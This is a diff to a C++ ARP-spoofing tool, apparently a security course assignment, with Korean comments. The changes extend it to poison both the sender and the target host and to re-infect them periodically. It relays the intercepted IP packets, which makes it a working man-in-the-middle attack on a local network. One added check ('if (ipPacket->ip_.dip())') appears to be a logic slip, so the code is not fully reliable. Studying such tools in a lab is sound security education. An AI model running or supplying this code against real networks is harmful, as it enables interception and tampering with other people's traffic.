@@ -42,9 +42,8 @@ void Receive(pcap_t* handle);
 
 bool runThread = true;
 
-
 std::list<FlowInfo> flows;
-
+std::map<Ip, Mac> arpTable;
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -55,6 +54,7 @@ void signal_handler (int sig)
 {
     printf("\nInterrupt Executed : %d\n",sig);
     runThread = false;
+	sleep(2);
 	exit(sig);
 }
 
@@ -63,6 +63,10 @@ void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
 	struct ifreq ifr;
 
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if(fd<0){
+		fprintf(stderr, "Fail Open Socket return %d\n",fd);
+		exit(-1);
+	}
 	ifr.ifr_addr.sa_family = AF_INET;
 
 	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);
@@ -79,16 +83,15 @@ void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
 
 
 Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
-	Mac mac;
 	Mac broadcast = Mac::broadcastMac();
 	Mac unknown = Mac::nullMac();
 
-	//eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
 	struct pcap_pkthdr* header;
 	const u_char* replyPacket;
 
 	while(true){
 		// mode : 0 = request, 1 = reply
+		// eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
 		EthArpPacket packet = MakeArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, Ip);
 		SendArpPacket(handle, packet);
 	
@@ -96,17 +99,15 @@ Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
 		if (res == 0) return 0;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-			return 0;
+			exit(-1);
 		}
 		
 		EthArpPacket* resPacket;
 
 		resPacket = (struct EthArpPacket *)replyPacket;
 		if(resPacket->eth_.type() == EthHdr::Arp){
-			if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp){
-				mac = Mac((uint8_t*)(resPacket->arp_.smac_));
-				return mac;
-			}
+			if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp)
+				return Mac((uint8_t*)(resPacket->arp_.smac_));
 			else continue;
 		}
 	}
@@ -141,7 +142,7 @@ EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac,
 void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
-		fprintf(stderr, "Infect Failed return %d error=%s\n", res, pcap_geterr(handle));
+		fprintf(stderr, "Send Arp Failed return %d error=%s\n", res, pcap_geterr(handle));
 	}
 	return;
 }
@@ -149,7 +150,7 @@ void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size){
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
 	if (res != 0) {
-		fprintf(stderr, "Relay Failed return %d error=%s\n", res, pcap_geterr(handle));
+		fprintf(stderr, "Send Ip Failed return %d error=%s\n", res, pcap_geterr(handle));
 	}
 	return;
 }
@@ -158,6 +159,21 @@ bool isSpoofed(const u_char *replyPacket, FlowInfo info){
 	EthHdr *eth = (struct EthHdr *)replyPacket;
 	if (eth->type() == EthHdr::Ip4){
 		EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
+		// 원래 나한테 보내려던 패킷 -> relay 필요 없음
+		if (ipPacket->ip_.dip())
+			return false;
+		
+		// Udp의 broadcast -> relay 필요 없음
+		if (ipPacket->ip_.p() == IpHdr::Udp){
+			if (ipPacket->eth_.dmac() == info.attackerMac)
+				return false;
+			if (ipPacket->eth_.dmac() == info.targetMac)
+				return false;
+			if (ipPacket->eth_.dmac() == Mac::broadcastMac())
+				return false;
+		}
+
+		// sender가 보낸 패킷 -> spoof 됨 -> relay 필요
 		if (ipPacket->ip_.sip() == info.senderIp && ipPacket->eth_.smac() == info.senderMac)
 			return true;
 	}
@@ -169,7 +185,8 @@ bool isRecovered(const u_char *replyPacket, FlowInfo info){
 	if (eth->type() == EthHdr::Arp){
 		EthArpPacket *arpPacket = (struct EthArpPacket *)replyPacket;
 		if (arpPacket->arp_.op() == ArpHdr::Reply){
-			if (arpPacket->eth_.dmac() == info.senderMac)
+			// recover 위해서 broadcast 하는 경우 -> recover 필요
+			if (arpPacket->eth_.dmac() == info.attackerMac)
 				return true;
 			if (arpPacket->eth_.dmac() == info.targetMac)
 				return true;
@@ -186,6 +203,7 @@ void Infect(pcap_t *handle){
 			SendArpPacket(handle, iter.infectPkt);
 			sleep(1);
 		}
+		sleep(5);
 	}
 }
 
@@ -219,6 +237,7 @@ void Receive(pcap_t* handle){
 			// recovered -> reinfect
 			if(isRecovered(replyPacket,iter))
 				ReInfect(handle, iter);
+			sleep(1);
 		}
 	}
 }
@@ -231,18 +250,17 @@ int main(int argc, char* argv[]) {
 	}
 
 	char* dev = argv[1];
-	std::map<Ip, Mac> arpTable;
 
 	Ip attackerIp; 
 	Mac attackerMac;
 	
-	char errbuf[PCAP_ERRBUF_SIZE];
-
 	GetMyInfo(&attackerIp, &attackerMac, dev);
+	printf("\n-------------[ATTACKER]-------------\n");
 	printf("[ATTACKER MAC ADDR = %s]\n", std::string(attackerMac).c_str());
 	printf("[ATTACKER IP ADDR = %s]\n", std::string(attackerIp).c_str());
 	arpTable[attackerIp] = attackerMac;
 
+	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
@@ -259,28 +277,38 @@ int main(int argc, char* argv[]) {
 		//arpTable에 senderIp에 대한 정보가 있는지 확인
 		if(!arpTable.count(info.senderIp))
 			arpTable[info.senderIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
-		else
-			fprintf(stderr, "couldn't get sender mac address (%s)\n",errbuf);
 
 		if(!arpTable.count(info.targetIp))
 			arpTable[info.targetIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
-		else
-			fprintf(stderr, "couldn't get target mac address (%s)\n",errbuf);
 
 		info.senderMac = arpTable[info.senderIp];
 		info.targetMac = arpTable[info.targetIp];
 
+		printf("\n-------------[SENDER]-------------\n");
 		printf("[SENDER MAC ADDR = %s]\n", std::string(info.senderMac).c_str());
 		printf("[SENDER IP ADDR = %s]\n", std::string(info.senderIp).c_str());
 
+		printf("\n-------------[TARGET]-------------\n");
 		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).c_str());
 		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).c_str());
 		
+		// sender 감염위해 Flow 생성
 		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
 		flows.push_back(info);
-		printf("Success Attack\n");
-	}
+		printf("Making Sender Infect Flow Done!! \n");
 
+		// target도 감염위해 Flow 생성
+		info.senderIp = Ip(argv[2*i+1]);
+		info.targetIp = Ip(argv[2*i]);
+		info.senderMac = arpTable[info.senderIp];
+		info.targetMac = arpTable[info.targetIp];
+		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
+		flows.push_back(info);
+
+		printf("Making Target Infect Flow Done!! \n");
+
+	}
+	printf("\n-------------Start Spoofing!!!!-------------\n");
 	signal(SIGINT, signal_handler);
 	std::thread infect_t(Infect, handle);
 	std::thread receive_t(Receive, handle);
